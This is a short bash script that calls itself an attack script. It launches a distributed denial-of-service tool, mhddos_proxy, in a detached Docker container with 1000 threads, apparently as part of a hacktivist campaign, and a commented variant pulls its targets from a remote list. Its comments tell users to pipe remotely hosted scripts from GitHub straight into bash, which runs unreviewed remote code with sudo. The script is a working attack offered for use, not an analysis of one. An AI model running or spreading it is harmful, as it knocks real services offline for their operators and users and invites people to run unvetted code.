#!/bin/bash



###### This is the attack script #####
##### To run it just paste the following command to your Terminal:
# >>>>> curl -s https://raw.githubusercontent.com/russskiykorablidinah/pihpah/main/attack.sh | bash <<<<<

sudo screen -d -m -S ddos sudo docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1000 --itarmy --table


#To run the attack and update the image / delete old images and containers
#curl -S https://raw.githubusercontent.com/russskiykorablidinah/pihpah/main/docker_cache.sh | bash
#sudo screen -d -m -S ddos sudo docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -c https://raw.githubusercontent.com/SlavaUkraineSince1991/DDoS-for-all/main/targets/targets.txt --table -t 1000
